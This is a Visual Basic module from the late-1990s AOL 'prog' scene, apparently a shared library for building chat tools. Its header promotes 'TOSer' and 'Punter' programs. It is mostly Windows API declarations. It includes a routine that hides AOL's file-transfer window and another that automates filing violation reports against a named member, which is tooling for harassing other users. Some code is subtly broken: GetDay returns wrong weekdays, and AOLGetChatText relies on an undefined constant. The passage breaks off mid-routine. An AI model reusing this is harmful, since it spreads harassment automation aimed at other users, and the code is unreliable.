Attribute VB_Name = "Skybox¹"
'Thank you for Downloading my BAS. Please do
'not copy my Subs or Functions. I did not write
'this BAS by myself. I used Some Subs and Functions
'From Other BAS's. Why you ask? Cause whats the point of
'wasting your time writing a code when the code
'is already out. If you have any questions or comments
'please E-mail me.
'If your making an AOL 3.0 and 4.0 Prog use the
'SendChat_3or4 Sub, It detects What AOL Version
'you have and then sends to chat.
'With my BAS you can make an IRC Bot, AOL Prog,
'TOSer, Server, MMer, Punter Tons of Stuff!
'
'For AOL 3.0, AOL 95 and AOL 4.0
'Visit my Site to Download VB3, VB4 or VB5!
'http://members.aol.com/F22Skybox/
'F22 Skybox@aol.com
'
'    -Skybox¹
'
'
'
'
'
Declare Function FillRect Lib "User" (ByVal hDC As Integer, LPRect As Rect, ByVal hBrush As Integer) As Integer
Declare Function SendMessageLong Lib "User" Alias "SendMessage" (ByVal hwnd As Integer, ByVal hMsg As Integer, ByVal wParam As Integer, ByVal lParam As Any) As Long
Declare Function DeleteObject Lib "GDI" (ByVal hObject As Integer) As Integer
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function GetPrivateProfileSection Lib "kernel32" Alias "GetPrivateProfileSectionA" (ByVal lpAppName As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function WritePrivateProfileSection Lib "kernel32" Alias "WritePrivateProfileSectionA" (ByVal lpAppName As String, ByVal lpString As String, ByVal lpFileName As String) As Long
Declare Function BringWindowToTop Lib "user32" (ByVal hwnd As Long) As Long
Declare Function enablewindow Lib "user32" Alias "EnableWindow" (ByVal hwnd As Long, ByVal fEnable As Long) As Long
Declare Function ReleaseCapture Lib "user32" () As Long
Declare Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
Declare Function RegisterClipboardFormat Lib "user32" Alias "RegisterClipboardFormatA" (ByVal lpString As String) As Long
Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As Rect, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function movewindow Lib "user32" Alias "MoveWindow" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, LPRect As Rect) As Long
Declare Function SetRect Lib "user32" (LPRect As Rect, ByVal X1 As Long, ByVal Y1 As Long, ByVal x2 As Long, ByVal Y2 As Long) As Long
Declare Function setparent Lib "user32" Alias "SetParent" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)

Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpenumfunc As Long, ByVal lParam As Long)
Declare Function sendmessagebynum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function findwindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Declare Function SendMessage2 Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function showwindow Lib "user32" Alias "ShowWindow" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function Getmenu Lib "user32" Alias "GetMenu" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function Gettopwindow Lib "user32" Alias "GetTopWindow" (ByVal hwnd As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cX As Long, ByVal cY As Long, ByVal wFlags As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function getwindowtext Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function getwindow Lib "user32" Alias "GetWindow" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndplaysound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Declare Function MciSendString& Lib "Winmm" Alias "mciSendStringA" (ByVal lpstrCommand$, ByVal lpstrReturnStr As Any, ByVal wReturnLen&, ByVal hcallback&)
Declare Function agGetStringFromLPSTR$ Lib "APIGuide.Dll" (ByVal lpString&)
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function WindowFromPointXY Lib "user32" Alias "WindowFromPoint" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As pointapi) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef source As Any, ByVal nBytes As Long)
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source&, ByVal dest&, ByVal nCount&)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source As String, ByVal dest As Long, ByVal nCount&)

Public Const SND_SYNC = &H0
Public Const SND_ASYNC = &H1
Public Const SND_NODEFAULT = &H2
Public Const SND_MEMORY = &H4
Public Const SND_ALIAS = &H10000
Public Const SND_FILENAME = &H20000
Public Const SND_RESOURCE = &H40004
Public Const SND_ALIAS_ID = &H110000
Public Const SND_ALIAS_START = 0
Public Const SND_LOOP = &H8
Public Const SND_NOSTOP = &H10
Public Const SND_VALID = &H1F
Public Const SND_NOWAIT = &H2000
Public Const SND_VALIDFLAGS = &H17201F

Public Const SND_RESERVED = &HFF000000
Public Const SND_TYPE_MASK = &H170007


Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_Close = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GetTextLength = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3
Public Const EM_GETLINE = &HC4

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_Setcursel = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const Flags = SWP_NOMOVE Or SWP_NOSIZE

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)

Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000
Public Const WM_NCMOUSEMOVE = &HA0
Public Const WM_NCLBUTTONDOWN = &HA1
Public Const WM_NCLBUTTONUP = &HA2

Public Const HTERROR = (-2)
Public Const HTTRANSPARENT = (-1)
Public Const HTNOWHERE = 0
Public Const HTCLIENT = 1
Public Const HTCAPTION = 2
Public Const HTSYSMENU = 3
Public Const HTGROWBOX = 4
Public Const HTSIZE = HTGROWBOX
Public Const HTMENU = 5
Public Const HTHSCROLL = 6
Public Const HTVSCROLL = 7
Public Const HTMINBUTTON = 8
Public Const HTMAXBUTTON = 9
Public Const HTLEFT = 10
Public Const HTRIGHT = 11
Public Const HTTOP = 12
Public Const HTTOPLEFT = 13
Public Const HTTOPRIGHT = 14
Public Const HTBOTTOM = 15
Public Const HTBOTTOMLEFT = 16
Public Const HTBOTTOMRIGHT = 17
Public Const HTBORDER = 18
Public Const HTREDUCE = HTMINBUTTON
Public Const HTZOOM = HTMAXBUTTON
Public Const HTSIZEFIRST = HTLEFT
Public Const HTSIZELAST = HTBOTTOMRIGHT

Type Rect
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type pointapi
   X As Long
   Y As Long
End Type
Global Title
Global Buff3
Global buff2
Global Buff
Global ct
Global RoomHits
Global Log
Global thelist
Global R&
Global entry$
Global inipath$
Global mmlastline

'All that Sound crap
'        V
'        V
 
 Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Long
 Private Declare Function mciSendCommandA Lib "Winmm" _
        (ByVal wDeviceID As Long, ByVal message As Long, _
        ByVal dwParam1 As Long, dwParam2 As Any) As Long

    Const MCI_OPEN = &H803
    Const MCI_CLOSE = &H804
    Const MCI_PLAY = &H806
    Const MCI_OPEN_TYPE = &H2000&
    Const MCI_OPEN_ELEMENT = &H200&
    Const MCI_WAIT = &H2&
    
    Private Type MCI_WAVE_OPEN_PARMS
        dwCallback As Long
        wDeviceID As Long
        lpstrDeviceType As String
        lpstrElementName As String
        lpstrAlias As String
        dwBufferSeconds As Long
    End Type
    
    Private Type MCI_PLAY_PARMS
        dwCallback As Long
        dwFrom As Long
        dwTo As Long
    End Type


'Start of Colors
Public Const red = &HFF&
Public Const GREEN = &HFF00&
Public Const BLUE = &HFF0000
Public Const YELLOW = &HFFFF&
Public Const WHITE = &HFFFFFF
Public Const BLACK = &H0&
Public Const PURPLE = &HFF00FF
Public Const GREY = &HC0C0C0
Public Const PINK = &HFF80FF
Public Const TURQUOISE = &HC0C000
' End of Colors
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long


Private Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Private Declare Function ClipCursor Lib "user32" (LPRect As Any) As Long

Private Declare Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long

Private Const SM_CYCAPTION = 4
Private Const SM_CXFRAME = 32
Private Const SM_CYFRAME = 33



'Pizza



Declare Function BitBlt Lib "GDI" (ByVal hDestDC As Integer, ByVal X As Integer, ByVal Y As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal hSrcDC As Integer, ByVal XSrc As Integer, ByVal YSrc As Integer, ByVal dwRop As Long) As Integer
Declare Function CreateCompatibleBitmap Lib "GDI" (ByVal hDC As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer) As Integer
Declare Function CreateCompatibleDC Lib "GDI" (ByVal hDC As Integer) As Integer
Declare Function CreateFont% Lib "GDI" (ByVal h%, ByVal w%, ByVal e%, ByVal O%, ByVal w%, ByVal i%, ByVal U%, ByVal s%, ByVal c%, ByVal OP%, ByVal CP%, ByVal Q%, ByVal PAF%, ByVal F$)
Declare Function CreateSolidBrush Lib "GDI" (ByVal crColor As Long) As Integer
Declare Function CreateWindow% Lib "User" (ByVal lpClassName$, ByVal lpWindowName$, ByVal dwStyle&, ByVal X%, ByVal Y%, ByVal nWidth%, ByVal nHeight%, ByVal hwndparent%, ByVal hMenu%, ByVal hInstance%, ByVal lpParam$)
Declare Function DeleteDC Lib "GDI" (ByVal hDC As Integer) As Integer
Declare Function DrawText Lib "User" (ByVal hDC As Integer, ByVal lpStr As String, ByVal nCount As Integer, LPRect As Rect, ByVal wFormat As Integer) As Integer
Declare Function EnableHardwareInput Lib "User" (ByVal bEnableInput As Integer) As Integer

Declare Function exitwindows Lib "User" Alias "ExitWindows" (ByVal dwReturnCode As Long, ByVal wReserved As Integer) As Integer
Declare Function FlashWindow Lib "User" (ByVal hwnd As Integer, ByVal bInvert As Integer) As Integer

Declare Function GetDC Lib "User" (ByVal hwnd As Integer) As Integer
Declare Function GetFreeSpace Lib "Kernel" (ByVal wFlags As Integer) As Long
Declare Function GetFreeSystemResources Lib "User" (ByVal fuSysResource As Integer) As Integer



Declare Function getmodulefilename Lib "Kernel" Alias "GetModuleFileName" (ByVal hModule As Integer, ByVal lpFileName As String, ByVal nSize As Integer) As Integer


Declare Function GetProfileString Lib "Kernel" (ByVal lpAppName As String, lpKeyName As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Integer) As Integer

Declare Function GetSystemDirectory Lib "Kernel" (ByVal lpBuffer As String, ByVal nSize As Integer) As Integer
Declare Function GetSystemMenu Lib "User" (ByVal hwnd As Integer, ByVal bRevert As Integer) As Integer
Declare Function GetTempDrive Lib "Kernel" (ByVal cDriveLetter As Integer) As Integer
Declare Function GetTempFileName Lib "Kernel" (ByVal cDriveLetter As Integer, ByVal lpPrefixString As String, ByVal wUnique As Integer, ByVal lpTempFileName As String) As Integer





Declare Function GetWindowWord Lib "User" (ByVal hwnd As Integer, ByVal nIndex As Integer) As Integer
Declare Function IsWindow Lib "User" (ByVal hwnd As Integer) As Integer


Declare Function LoadBitmap Lib "User" (ByVal hInstance%, ByVal lpBitMapName As Any) As Integer
Declare Function lstrcpy Lib "Kernel" (ByVal lpString1 As Any, ByVal lpString2 As Any) As Long
Declare Function ReleaseDC Lib "User" (ByVal hwnd As Integer, ByVal hDC As Integer) As Integer

Declare Function SelectObject Lib "GDI" (ByVal hDC As Integer, ByVal hObject As Integer) As Integer

Declare Function SetMenu Lib "User" (ByVal hwnd As Integer, ByVal hMenu As Integer) As Integer
Declare Function SetMenuItemBitmaps Lib "User" (ByVal hMenu As Integer, ByVal nPosition As Integer, ByVal wFlags As Integer, ByVal hBitmapUnchecked As Integer, ByVal hBitmapChecked As Integer) As Integer

Declare Function SetPixel Lib "GDI" (ByVal hDC As Integer, ByVal X As Integer, ByVal Y As Integer, ByVal crColor As Long) As Long
Declare Function settextcolor Lib "GDI" Alias "SetTextColor" (ByVal hDC As Integer, ByVal crColor As Long) As Long


Declare Function StretchBlt% Lib "GDI" (ByVal hDestDC%, ByVal X%, ByVal Y%, ByVal nWidth%, ByVal nHeight%, ByVal hSrcDC%, ByVal XSrc%, ByVal YSrc%, ByVal nSrcWidth%, ByVal nSrcHeight%, ByVal dwRop As Long)
Declare Function TextOut Lib "GDI" (ByVal hDC As Integer, ByVal X As Integer, ByVal Y As Integer, ByVal lpString As String, ByVal nCount As Integer) As Integer
Declare Function WindowFromPoint Lib "User" (ByVal ptScreen As Any) As Integer

Declare Function WriteProfileString Lib "Kernel" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal lpString As String) As Integer

'API Sub's


Declare Sub hmemcpy Lib "Kernel" (hpvDest As Any, hpvSource As Any, ByVal cbCopy&)
Declare Sub InvertRect Lib "User" (ByVal hDC As Integer, LPRect As Rect)
Declare Sub ModifyMenu Lib "User" (ByVal hMenu As Integer, ByVal nPosition As Integer, ByVal wFlags As Integer, ByVal wIDNewItem As Integer, ByVal lpString As Long)

Declare Sub Rectangle Lib "GDI" (ByVal hDC As Integer, ByVal X1 As Integer, ByVal Y1 As Integer, ByVal x2 As Integer, ByVal Y2 As Integer)

Declare Sub Yield Lib "Kernel" ()

'Important Global's



Global Const SW_FLAGS = SWP_NOMOVE Or SWP_NOSIZE

'API Global's

Global Const CB_GETCOUNT = (WM_USER + 6)
Global Const CB_GETITEMDATA = (WM_USER + 16)
Global Const CB_GETLBTEXTLEN = (WM_USER + 9)
Global Const CB_INSERTSTRING = (WM_USER + 10)
Global Const CB_SETCURSEL = (WM_USER + 14)
Global Const CB_SETEDITSEL = (WM_USER + 2)
Global Const CB_SHOWDROPDOWN = (WM_USER + 15)

Global Const EM_GETLINECOUNT = WM_USER + 10
Global Const EM_GETSEL = WM_USER + 0
Global Const EM_REPLACESEL = WM_USER + 18
Global Const EM_SCROLL = WM_USER + 5
Global Const EM_SETFONT = WM_USER + 19
Global Const EM_SETREADONLY = (WM_USER + 31)
Global Const EW_REBOOTSYSTEM = &H43





'Other Globals
Global Abort As Integer
Global AscBord(2) As String
Global findchild As Integer
Global HoldText As String
Global IntMin As Integer
Global IntSec As Integer
Global OldText As String
Global OldTextLength As Integer

'Kernel
Declare Function lStrlenAPI Lib "Kernel" Alias "lStrln" (ByVal lp As Long) As Integer
Declare Function GetWindowDirectory% Lib "Kernel" (ByVal lpBuffer$, ByVal nSize%)
Declare Function GetWinFlags Lib "Kernel" () As Long
Declare Function GetVersion Lib "Kernel" () As Long
Declare Function GetProfileInt Lib "Kernel" (ByVal lpAppName$, ByVal lpKeyName$, ByVal nDefault%) As Integer
Declare Function GetPrivateProfileInt Lib "Kernel" (ByVal lpAppName$, ByVal lpKeyName$, ByVal nDefault%, ByVal lpFileName$) As Integer

Declare Function fCreateShellLink Lib "STKIT432.DLL" (ByVal lpstrFolderName As String, ByVal lpstrLinkName As String, ByVal lpstrLinkPath As String, ByVal lpstrLinkArgs As String) As Long


Const SPIF_UPDATEINIFILE = &H1
Const SPI_SETDESKWALLPAPER = 20
Const SPIF_SENDWININICHANGE = &H2

Private Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, _
lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, _
lpTotalNumberOfClusters As Long) As Long

Type DISKSPACEINFO
    RootPath As String * 3
    FreeBytes As Long
    TotalBytes As Long
    FreePcnt As Single
    UsedPcnt As Single
End Type
Global CurrentDisk As DISKSPACEINFO

Private Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As Any) As Boolean
Private Declare Function ChangeDisplaySettings Lib "user32" Alias "ChangeDisplaySettingsA" (lpDevMode As Any, ByVal dwFlags As Long) As Long

Const CCDEVICENAME = 32
Const CCFORMNAME = 32
Const DM_PELSWIDTH = &H80000
Const DM_PELSHEIGHT = &H100000

Private Type DEVMODE
    dmDeviceName As String * CCDEVICENAME
    dmSpecVersion As Integer
    dmDriverVersion As Integer
    dmSize As Integer
    dmDriverExtra As Integer

    dmFields As Long
    dmOrientation As Integer
    dmPaperSize As Integer
    dmPaperLength As Integer
    dmPaperWidth As Integer
    dmScale As Integer
    dmCopies As Integer
    dmDefaultSource As Integer
    dmPrintQuality As Integer
    dmColor As Integer
    dmDuplex As Integer
    dmYResolution As Integer
    dmTTOption As Integer
    dmCollate As Integer

    dmFormName As String * CCFORMNAME
    dmUnusedPadding As Integer
    dmBitsPerPel As Integer
    dmPelsWidth As Long
    dmPelsHeight As Long
    dmDisplayFlags As Long
    dmDisplayFrequency As Long
End Type
Dim DevM As DEVMODE

Public Const JOY_CAL_READ5 = &H400000
Public Const JOY_CAL_READ6 = &H800000
Public Const JOY_CAL_READZONLY = &H1000000
Public Const JOY_CAL_READUONLY = &H4000000
Public Const JOY_CAL_READVONLY = &H8000000

' Declare necessary API data structure.  THIS I know is necessary.
Type JOYINFOEX
        dwSize As Long                 '  size of structure
        dwFlags As Long                 '  flags to indicate what to return
        dwXpos As Long                '  x position
        dwYpos As Long                '  y position
        dwZpos As Long                '  z position
        dwRpos As Long                 '  rudder/4th axis position
        dwUpos As Long                 '  5th axis position
        dwVpos As Long                 '  6th axis position
        dwButtons As Long             '  button states
        dwButtonNumber As Long        '  current button number pressed
        dwPOV As Long                 '  point of view state
        dwReserved1 As Long                 '  reserved for communication between winmm driver
        dwReserved2 As Long                 '  reserved for future expansion
End Type
Function AOLGetChatText()
room% = AOLFindRoom
aol% = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol%, "MDIClient")
Msg$ = String$(255, 0)
XX% = SendMessageLong(room%, WM_ProGGer, 254, Msg$)
Msg$ = Trim$(Msg$)
AOLGetChatText = Msg$
End Function
Function GetDay()
'Label1.caption = GetDay
'Written By Skybox
Static D(7)
D(1) = "Sunday"
D(2) = "Monday"
D(3) = "Tuesday"
D(4) = "Wednesday"
D(5) = "Thursday"
D(6) = "Friday"
D(7) = "Saturday"
If Day(Now) = 1 Then
GetDay = D(1)
ElseIf Day(Now) = 2 Then
GetDay = D(2)
ElseIf Day(Now) = 3 Then
GetDay = D(3)
ElseIf Day(Now) = 4 Then
GetDay = D(4)
ElseIf Day(Now) = 5 Then
GetDay = D(5)
ElseIf Day(Now) = 6 Then
GetDay = D(6)
ElseIf Day(Now) = 7 Then
GetDay = D(7)
End If

End Function


Function GetRootDir()
'Written by Skybox
GetRootDir = CurrentDisk.RootPath
End Function

Function GetYear()
GetYear = Year(Now)
End Function
Function GetMonth()
'Written By Skybox
Static M(12)
M(1) = "January"
M(2) = "Febuary"
M(3) = "March"
M(4) = "April"
M(5) = "May"
M(6) = "June"
M(7) = "July"
M(8) = "August"
M(9) = "September"
M(10) = "October"
M(11) = "November"
M(12) = "December"
If Month(Now) = 1 Then
GetMonth = M(1)
ElseIf Month(Now) = 2 Then
GetMonth = M(2)
ElseIf Month(Now) = 3 Then
GetMonth = M(3)
ElseIf Month(Now) = 4 Then
GetMonth = M(4)
ElseIf Month(Now) = 5 Then
GetMonth = M(5)
ElseIf Month(Now) = 6 Then
GetMonth = M(6)
ElseIf Month(Now) = 7 Then
GetMonth = M(7)
ElseIf Month(Now) = 8 Then
GetMonth = M(8)
ElseIf Month(Now) = 9 Then
GetMonth = M(9)
ElseIf Month(Now) = 10 Then
GetMonth = M(10)
ElseIf Month(Now) = 11 Then
GetMonth = M(11)
ElseIf Month(Now) = 12 Then
GetMonth = M(12)
End If
End Function


Sub HideTransferWin()
'Hides The File Transfer Window
'Written By Skybox
aol% = findwindow("AOL Frame25", vbNullString)
File% = FindChildByTitle(aol%, "File Transfer - ")
X = showwindow(File%, SW_HIDE)
End Sub

Sub TOS_ProfileViolation_1(Who$)
Call runmenubystring("Get a Member's Profile", "Mem&bers")
Do: DoEvents
aol = findwindow("AOL Frame25", 0&)
mdi% = FindChildByClass(aol, "MDIClient")
profile% = FindChildByTitle(mdi%, "Get a Member's Profile")
editz% = FindChildByClass(profile%, "_AOL_Edit")
getit% = FindChildByClass(profile%, "_AOL_Button")
Loop Until profile% <> 0
Ao_SetText editz%, Who$
Ao_Click getit%
timeout 0.001
okw% = findwindow("#32770", "America Online")
If okw% <> 0 Then
Exit Sub
End If
Do: DoEvents
Prowin% = FindChildByTitle(mdi%, "Member Profile")
If Prowin% <> 0 Then MsgBox "Highlight the violation, and then click ''OK''.", 64, ""
Loop Until Prowin% <> 0
run "&Copy"
KillWin Prowin%
Ao_Keyword ("kohelp")
Do: DoEvents
toswin% = FindChildByTitle(mdi%, "I Need Help!")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Ao_Click bttn3%
Do: DoEvents
toswin2% = FindChildByTitle(mdi%, "Report A Violation")
bttnz% = FindChildByClass(toswin2%, "_AOL_Icon")
blah% = GetNextWindow(bttnz%, 2)
blah2% = GetNextWindow(blah%, 2)
blah3% = GetNextWindow(blah2%, 2)
blah4% = GetNextWindow(blah3%, 2)
blah5% = GetNextWindow(blah4%, 2)
bttnz2% = GetNextWindow(blah5%, 2)
Loop Until toswin2% <> 0
Ao_Click bttnz2%
timeout 0.001
Do: DoEvents
toswin3% = FindChildByTitle(mdi%, "Screen Name & Profile Violations")
shit% = FindChildByTitle(toswin3%, "Screenname:")
namez% = GetNextWindow(shit%, 2)
shit2% = FindChildByTitle(toswin3%, "Paste Profile Violation Here:")
said% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(said%, 2)
donez% = GetNextWindow(shit3%, 2)
Loop Until toswin3% <> 0
Ao_SetText namez%, Who$
Ao_Click said%
run "&Paste"
Ao_Click donez%
timeout 0.001
waitforok
KillWin toswin3%
KillWin toswin2%
KillWin toswin%
End Sub

Sub TOS_ProfileViolation_2(Who$)
Call runmenubystring("Get a Member's Profile", "Mem&bers")
Do: DoEvents
